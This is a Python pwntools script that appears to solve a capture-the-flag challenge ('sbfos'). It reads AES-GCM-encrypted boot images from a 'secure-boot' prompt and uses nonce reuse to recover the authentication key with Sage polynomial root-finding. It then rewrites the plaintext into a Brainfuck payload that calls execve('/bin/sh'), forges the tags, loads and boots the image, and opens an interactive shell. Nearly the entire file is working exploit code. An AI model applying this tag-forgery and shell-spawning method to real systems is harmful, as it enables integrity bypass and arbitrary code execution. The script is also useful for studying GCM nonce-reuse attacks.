import struct
import ast
import codecs
from pwn import *

__NR_execve = 59

payload_ptxt = ''
payload_ptxt += '>>,>++++++++' # setup read args
# | __NR_read (0) | stdin (0) | &cell2 | [length (8)]
payload_ptxt += '<<<.' # call read, so we can get input without encoding arithmetic in BF
# | [read's return (8)] | stdin (0) | "/bin/sh\0" | 8
payload_ptxt += '>>>' + '+' * (__NR_execve - 8)
# | 8 | 0 | "/bin/sh\0" | [__NR_execve]
payload_ptxt += '>,' + '-'*8*2
# | 8 | 0 | "/bin/sh\0" | __NR_execve | [ &"/bin/sh\0" ]
payload_ptxt += '<.' # execve(&"/bin/sh\0", 0, 0)

print('payload: %r' % (payload_ptxt,))

p = process('../handout/sbfos')
#p = process(['strace', '-f', '-etrace=execve', '../handout/sbfos'])

p.recvuntil('secure-boot$')
p.sendline('dump')

contains_dump = p.recvuntil('secure-boot$')

hexdump = re.findall(b'[0-9a-f]*', contains_dump[:-len('secure-boot$')])
raw_ctxt = codecs.decode(b''.join(hexdump), 'hex')

print('%d %r' % (len(raw_ctxt), repr(raw_ctxt)))

# compute GCM key from nonce reuse in raw_ctxt, xor with known_ptxt and payload_ptxt, then fix up the tags

ctxts = []
tags = []
i = 0
while i < len(raw_ctxt):
    ctxts.append(raw_ctxt[i:i+512])
    i += 512
    tags.append(raw_ctxt[i:i+16])
    i += 16

print('ctxts: %r' % (ctxts,))
print('tags: %r' % (tags,))

def u128le(x):
    a, b = struct.unpack("<QQ", x)
    return a | b << 64

def p128le(x):
    mask = (1 << 64) - 1
    a, b = x & mask, (x >> 64) & mask
    return struct.pack("<QQ", a, b)

def u128be(x):
    a, b = struct.unpack(">QQ", x)
    return a << 64 | b

def p128be(x):
    mask = (1 << 64) - 1
    a, b = x & mask, (x >> 64) & mask
    return struct.pack(">QQ", b, a)

def revbits(x):
    y = 0
    for i in range(128):
        y |= ((x >> i) & 1) << (127 - i)
    return y

def u128x(x):
    from Crypto.Util.number import bytes_to_long
    r = 0
    y = bin(bytes_to_long(x))[2:].zfill(128)
    for i, z in enumerate(y):
        r |= (1 << i) * int(z)
    return r

assert revbits(u128be(b'0123456789abcdef')) == u128x(b'0123456789abcdef')

chunks = lambda xs, n: [xs[i*n:(i+1)*n] for i in range(len(xs) // n)]

def ctxt_to_coeffs(ctxt, tag):
    return [u128be(a) for a in chunks(ctxt, 16)] + [u128le(p128le(len(ctxt)*8)), u128be(tag)]

#coeffs1 = [u128le(a) for a in chunks(ctxts[0], 16)] + [len(ctxts[0]), u128le(tags[0])]
#coeffs2 = [u128le(a) for a in chunks(ctxts[0]+ctxts[1], 16)] + [len(ctxts[0]+ctxts[1]), u128le(tags[1])]
coeffs = []
for i in range(0, 8):
    cumulative_ctxt = b''.join(ctxts[j] for j in range(i+1))
    print('len cumulative[%d]: %d' % (i, len(cumulative_ctxt)))
    coeffs.append(ctxt_to_coeffs(cumulative_ctxt, tags[i]))

known_ptxt = '/* 0 7103816 */++++++++>++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 1 2912108 */<++++++++++++++++++++++++++++++++++++++++++++>++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 2 7304992 */<++++++++++++++++++++++++++++++++>++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 3 6581362 */<++++++++++++++++++++++++++++++++++++++++++++++++++>++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<++++++++++++++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]/* 4 2593 */<+++++++++++++++++++++++++++++++++>+++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<+++++++++++>+<[->[>++<-]>[<+>-]<<]>[<<+>>-]<,---------------------------------------->+++>,------------------------------------------------>+++>,-------------------------------------------------------->+++>,---------------------------------------------------------------->+++>,------------------------------------------------------------------------>+++>++++++++++++++++++++>+>,------------------------------------------------------------------------------------------------>+++++<<<.\n'

known_ptxt = known_ptxt.ljust((512)*8, '\x00')

modified_ctxt = [ord(c) for c in b''.join(ctxts)]
delta_ctxt = [0 for _ in b''.join(ctxts)]

print(len(modified_ctxt))
for i, x in enumerate(known_ptxt):
    modified_ctxt[i] ^= ord(x)
    delta_ctxt[i] ^= ord(x)

for i, x in enumerate(payload_ptxt):
    modified_ctxt[i] ^= ord(x)
    delta_ctxt[i] ^= ord(x)

modified_ctxt = b''.join(chr(c) for c in modified_ctxt)
delta_ctxt = b''.join(chr(c) for c in delta_ctxt)

targets = []
for i in range(8):
    targets.append(ctxt_to_coeffs(modified_ctxt[:(i+1)*512], b'\0'*16))
    #targets.append(ctxt_to_coeffs(delta_ctxt[i*512:(i+1)*512], b'\0'*16))
    #targets.append(ctxt_to_coeffs(ctxts[i], b'\0'*16))

from known_key import theirgcm, ecbdec, ecbenc
test_key = b'key'*5+b'k'
test_iv = b'iviviviviviv'
#test_ptxt = ecbenc.update(test_iv+b'\0\0\0\x02')
test_ptxt = '\x41'*16
print('test_ptxt: %r %r' % (test_ptxt, ecbdec.update(test_ptxt)))
test_ctxt, test_tag = theirgcm(test_key, test_iv, test_ptxt)
print('test_ctxt: %r\ntest_tag: %r' % (test_ctxt, test_tag))
print('dec(test_ctxt): %r' % (ecbdec.update(test_ctxt),))
test_H = u128be(ecbenc.update(p128le(0)))
test_S = u128be(ecbenc.update(test_iv+'\0\0\0\1'))

print('j0: %032x' % (test_S,))
print('dec(j0): %r' % (ecbdec.update(p128be(test_S)),))

test_coeffs = ctxt_to_coeffs(test_ctxt, b'\0'*16) # Cx^2 + Lx + 0
test_tag = u128be(test_tag)

'''
coeffs = []
coeffs.append(ctxt_to_coeffs(*theirgcm(test_key, test_iv, 'A'*16)))
coeffs.append(ctxt_to_coeffs(*theirgcm(test_key, test_iv, 'A'*16+'B'*16)))
#coeffs.append(ctxt_to_coeffs(*theirgcm(test_key, test_iv, 'B'*16)))

targets = []
targets.append(ctxt_to_coeffs(p128be(u128be(ecbenc.update(test_iv+'\0\0\0\2')) ^ u128be('C'*16)), '\0'*16))
'''

with open('tmp.sage', 'w') as f:
    f.write('''
import itertools
F, x = GF(2**128, name='x', modulus=x**128 + x**7 + x**2 + x + 1).objgen()
#F, x = GF(2**128, name='x', modulus=x**128 + x**127 + x**126 + x**121 + 1).objgen() # did we have the modulus in the wrong endianness?
R, y = PolynomialRing(F, 'y').objgen()

unpoly = lambda a: int(''.join([str(a.polynomial()[i]) for i in range(128)]), 2)

prepoly = lambda a: sum([((a >> (127-i)) & 1)*x**i for i in range(128)])
#prepoly = lambda a: sum([((a >> i) & 1)*x**i for i in range(128)])

poly = lambda xs: sum([prepoly(a)*y**(len(xs)-i-1) for (i, a) in enumerate(xs)])
#poly = lambda xs: sum([prepoly(a)*y**i for (i, a) in enumerate(xs)])

#poly = lambda xs: sum([F.fetch_int(a)*y**i for (i, a) in enumerate(xs)])

#coeffs1 = {coeffs1}
#coeffs2 = {coeffs2}
coeffs = {coeffs}

test_H = prepoly({test_H})
test_S = prepoly({test_S})
test_tag = prepoly({test_tag})
test_coeffs = {test_coeffs}
test_L = prepoly(test_coeffs[1])

print('test coeffs: %032x %032x %032x' % (test_coeffs[0], test_coeffs[1], test_coeffs[2]))
print('tag ^ j0: %032x' % ((test_tag + test_S).integer_representation(),))
print('L: %032x' % (test_L.integer_representation(),))
print('(L * H): %032x' % ((test_L * test_H).integer_representation(),))
print('(L * H) ^ j0: %032x' % (((test_L * test_H) + test_S).integer_representation(),))

print('test poly:     %16x' % (poly(test_coeffs)(test_H).integer_representation(),))
print('test S:        %16x' % (unpoly(test_S),))
print('test H:        %16x' % (unpoly(test_H),))
print('test poly + S: %16x' % ((poly(test_coeffs)(test_H) + test_S).integer_representation(),))
print('test tag:      %16x' % (test_tag.integer_representation(),))
assert poly(test_coeffs)(test_H) + test_S == test_tag

targets = {targets}

rootss = []
for f, g in list(itertools.combinations(coeffs, 2))[:8]:
    print('.')
    h = poly(f) + poly(g)
    #print(h)
    rootss.append(h.roots(ring=F, multiplicities=False))

raw_roots = []
for roots in rootss:
    for root in roots:
        if hasattr(root, 'degree'):
            if root.degree() == 0:
                raw_roots.append(root[0])
        else:
            raw_roots.append(root)

print('raw_roots: %r' % (['%032x' % (unpoly(a),) for a in raw_roots],))

tmp_coeffs = [c for c in coeffs[0]]
tmp_coeffs[-1] = 0

Hinv = 1 / test_H
print('Hinv: %032x' % (Hinv.integer_representation(),))
print('H * Hinv: %032x' % ((test_H * Hinv).integer_representation(),))

candidate_S = []
candidate_tags = []
for root in set(raw_roots):
    tags = []
    print('g1: %r' % (['%032x' % (a,) for a in coeffs[0]],))
    print('root: %032x g1(root): %032x' % (unpoly(root), (unpoly(poly(coeffs[0])(root)))))
    #print('root: %032x g1(root): %032x' % (root, (poly(coeffs[0])(prepoly(root)) / test_H).integer_representation()))
    #print('root: %032x t(root): %032x' % (root, (prepoly(coeffs[0][2]) + (poly(tmp_coeffs)(prepoly(root)))).integer_representation()))
    #C = prepoly(coeffs[0][0])
    #L = prepoly(coeffs[0][1])
    #T = prepoly(coeffs[0][2])
    #H = root
    #assert len(coeffs[0]) == 3
    #print('root: %032x test: %032x' % (unpoly(root), ((((C * H) + L) * H) + T).integer_representation()))
    S = poly(coeffs[0])(root)
    S1 = poly(coeffs[1])(root)
    candidate_S.append((unpoly(root), unpoly(S), unpoly(S1)))
    for i, t in enumerate(targets):
        print('target coeffs: %r' % (['%032x' % (a,) for a in t],))
        target_poly = poly(t)
        #tag = (target_poly(root) + poly(tmp_coeffs)(root)).integer_representation()
        print('t(H): %032x' % (unpoly(target_poly(root)),))
        tag = target_poly(root) + S
        #print('tag0? %032x' % (tag.integer_representation(),))
        print('tag1? %032x' % (unpoly(tag),))
        tags.append(unpoly(tag))
    if any(tags):
        print('candidate tag: %r' % (['%032x' % (a,) for a in tags],))
        candidate_tags.append(tuple(tags))
    print('-'*5)

#print([[r[0].integer_representation() for r in root] for root in rootss])
#print(raw_roots)
print((list(set(candidate_tags)), list(set(candidate_S))))
'''.format(coeffs1=coeffs[0], coeffs2=coeffs[1], **locals()))

q = process(['sage', 'tmp.sage'])
sage_output = q.recvall()
print(codecs.decode(sage_output, 'utf8'))
candidate_tags, candidate_Ss = ast.literal_eval(sage_output.strip().split(b'\n')[-1])
print('candidate_tags: %r' % (candidate_tags,))

for (H, S, S1) in candidate_Ss:
    print('(H, S, S1): %032x %032x %032x' % (H, S, S1))
    print('\tdecryption: %r' % (ecbdec.update(p128be(revbits(H))),))
    print('\tdecryption: %r' % (ecbdec.update(p128le(revbits(H))),))
    print('\tdecryption: %r' % (ecbdec.update(p128be(H)),))
    print('\tdecryption: %r' % (ecbdec.update(p128le(H)),))

'''
their_ctxt, _ = theirgcm(b'\0'*16, b'\0'*12, payload_ptxt.ljust(512*8, '\x00'))
if their_ctxt != modified_ctxt:
    print('their_ctxt: %r\nour_ctxt: %r' % (their_ctxt, modified_ctxt))
    print('diff: %r' % (b''.join(chr(ord(a)^ord(b)) for (a,b) in zip(modified_ctxt, their_ctxt)),))
    print('lengths: %d %d' % (len(their_ctxt), len(modified_ctxt)))
assert their_ctxt == modified_ctxt

their_tags = [theirgcm(b'\0'*16, b'\0'*12, payload_ptxt.ljust(512*8, '\x00')[:512*(i+1)])[1] for i in range(8)]
#their_tags = [theirgcm(b'\0'*16, b'\0'*12, known_ptxt.ljust(512*8, '\x00')[:512*(i+1)])[1] for i in range(8)]

print('their_tags: %r' % (their_tags,))
'''

print('original tags: %r' % (tags,))

for i, ctags in enumerate(candidate_tags):
    print('candidate %d' % (i,))
    #print('their_tags: %r' % (their_tags,))
    forged_tags = []
    for j, tag in enumerate(ctags):
        #print('\t%r %r %r %r' % (p128le(tag), p128be(tag), p128le(revbits(tag)), p128be(revbits(tag))))
        #print('\t%r %r %r' % (p128be(revbits(tag)), p128be(revbits(tag)^u128be(tags[j])), p128be(revbits(tag^u128be(tags[j])))))
        print('\t%r' % (p128be(tag),))
        forged_tags.append(p128be(tag))

    forged_ctxt = ''.join(modified_ctxt[i*512:(i+1)*512]+forged_tags[i] for i in range(8))
    #forged_ctxt = ''.join(their_ctxt[i*512:(i+1)*512]+their_tags[i] for i in range(8))
    #forged_ctxt = ''.join(theirgcm(b'\0'*16, b'\0'*12, known_ptxt)[0][i*512:(i+1)*512]+their_tags[i] for i in range(8))
    p.sendline('load')

    p.recvregex('Enter ciphertext as hexpairs \\(.... raw bytes\\):')
    p.sendline(codecs.encode(forged_ctxt, 'hex'))

    load_response = p.recvuntil('secure-boot$')
    print(load_response)

    if 'Decryption failed' not in load_response:
        print('Candidate %d succeeded!' % (i,))
        p.sendline('boot')
        p.sendline('/bin/sh\0')

        p.interactive()
        break
